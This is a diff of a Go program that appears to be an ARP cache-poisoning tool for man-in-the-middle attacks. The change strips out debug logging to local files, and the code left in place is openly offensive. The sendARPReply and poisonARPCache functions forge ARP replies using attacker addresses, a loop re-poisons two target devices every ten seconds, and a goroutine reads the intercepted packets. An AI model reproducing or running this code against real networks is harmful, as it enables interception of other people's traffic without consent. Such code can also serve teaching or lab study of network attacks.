@@ -95,7 +95,7 @@ func mapIPstoMAC(ips ...string) ([]*DeviceInfo, error) {
 	return devices, nil
 }
 
-func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
+func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
 	fromIP := net.ParseIP(from.IP)
 	/*
 		fromMAC, err := net.ParseMAC(from.MAC)
@@ -117,8 +117,6 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		EthernetType: layers.EthernetTypeARP,
 	}
 
-	fmt.Fprintln(logFile, "eth: ", eth.SrcMAC, "-->", eth.DstMAC)
-
 	arp := layers.ARP{
 		AddrType:          layers.LinkTypeEthernet,
 		Protocol:          layers.EthernetTypeIPv4,
@@ -130,8 +128,6 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 		DstHwAddress:      toMAC,
 		DstProtAddress:    toIP.To4(),
 	}
-
-	fmt.Fprintln(logFile, "arp: ", net.HardwareAddr(arp.SourceHwAddress).String(), "-->", net.IP(arp.SourceProtAddress).String(), "|", net.HardwareAddr(arp.DstHwAddress).String(), "-->", net.IP(arp.DstProtAddress).String())
 
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
@@ -150,15 +146,15 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 	return nil
 }
 
-func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle, logFile *os.File) error {
+func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
 	dev1 := devicesInfo[0]
 	dev2 := devicesInfo[1]
 
-	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle, logFile); err != nil {
+	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle); err != nil {
 		return err
 	}
 
-	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle, logFile); err != nil {
+	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle); err != nil {
 		return err
 	}
 
@@ -243,11 +239,10 @@ func getAttackerInfo(ifaceArg string) (*AttackerInfo, error) {
 	return &info, nil
 }
 
-func readPackets(deviceHandle *pcap.Handle, log *os.File) {
+func readPackets(deviceHandle *pcap.Handle) {
 	packetSource := gopacket.NewPacketSource(deviceHandle, deviceHandle.LinkType())
 
 	for packet := range packetSource.Packets() {
-		fmt.Fprintln(log, packet.Dump())
 		arpLayer := packet.Layer(layers.LayerTypeARP)
 		if arpLayer == nil {
 			continue
@@ -300,18 +295,6 @@ func main() {
 	endSignal := make(chan os.Signal, 1)
 	signal.Notify(endSignal, syscall.SIGTERM, syscall.SIGINT)
 
-	writeARPFile, err := os.Create("writeARP.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer writeARPFile.Close()
-
-	readPacketsFile, err := os.Create("readPackets.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer readPacketsFile.Close()
-
 	go func() {
 		for sig := range endSignal {
 			fmt.Println(sig.String(), "detected. ending program")
@@ -320,10 +303,10 @@ func main() {
 		}
 	}()
 
-	go readPackets(deviceHandle, readPacketsFile)
+	go readPackets(deviceHandle)
 
 	for {
-		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle, writeARPFile); err != nil {
+		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle); err != nil {
 			log.Fatal(err)
 		}
 		time.Sleep(time.Second * 10)
